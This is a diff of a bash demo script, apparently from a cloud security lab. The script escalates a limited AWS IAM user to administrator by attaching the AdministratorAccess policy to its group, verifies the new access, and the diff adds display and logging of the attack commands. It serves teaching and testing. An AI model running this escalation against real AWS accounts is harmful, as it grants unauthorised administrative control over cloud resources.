@@ -3,13 +3,33 @@
 # Demo script for iam:AttachGroupPolicy privilege escalation
 # This script demonstrates how a user with AttachGroupPolicy permission can escalate to admin
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-iam-010-to-admin-starting-user"
@@ -51,6 +71,7 @@ echo -e "${YELLOW}Step 2: Verifying identity${NC}"
 unset AWS_SESSION_TOKEN
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -62,6 +83,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -69,6 +91,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Check current permissions (should be limited)
 echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
 echo "Attempting to list S3 buckets (should fail)..."
+show_cmd "aws s3 ls"
 if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
     echo -e "${GREEN}✓ Confirmed limited permissions (cannot list S3 buckets)${NC}"
 else
@@ -78,6 +101,7 @@ echo ""
 
 # Step 5: Verify group membership
 echo -e "${YELLOW}Step 5: Verifying group membership${NC}"
+show_cmd "aws iam list-groups-for-user --user-name $STARTING_USER --query 'Groups[*].GroupName' --output text"
 USER_GROUPS=$(aws iam list-groups-for-user --user-name $STARTING_USER --query 'Groups[*].GroupName' --output text)
 echo "User is member of groups: $USER_GROUPS"
 
@@ -94,6 +118,7 @@ echo "This is the privilege escalation vector..."
 
 ADMIN_POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"
 
+show_attack_cmd "aws iam attach-group-policy --group-name $GROUP_NAME --policy-arn $ADMIN_POLICY_ARN"
 aws iam attach-group-policy \
     --group-name $GROUP_NAME \
     --policy-arn $ADMIN_POLICY_ARN
@@ -107,11 +132,13 @@ sleep 15
 
 # Step 7: Verify admin access
 echo -e "${YELLOW}Step 7: Verifying administrator access${NC}"
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
 
 # Test admin permissions
 echo "Testing admin permissions (listing IAM users)..."
+show_cmd "aws iam list-users --query 'Users[*].UserName' --output text"
 IAM_USERS=$(aws iam list-users --query 'Users[*].UserName' --output text | head -5)
 echo "Successfully listed IAM users: $IAM_USERS"
 echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
@@ -128,6 +155,15 @@ echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (iam:AttachGroupPolicy) → $GROUP_NAME → AdministratorAccess → Admin"
 echo ""
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+    echo ""
+fi
+
 echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to detach the admin policy${NC}"
 echo ""
 
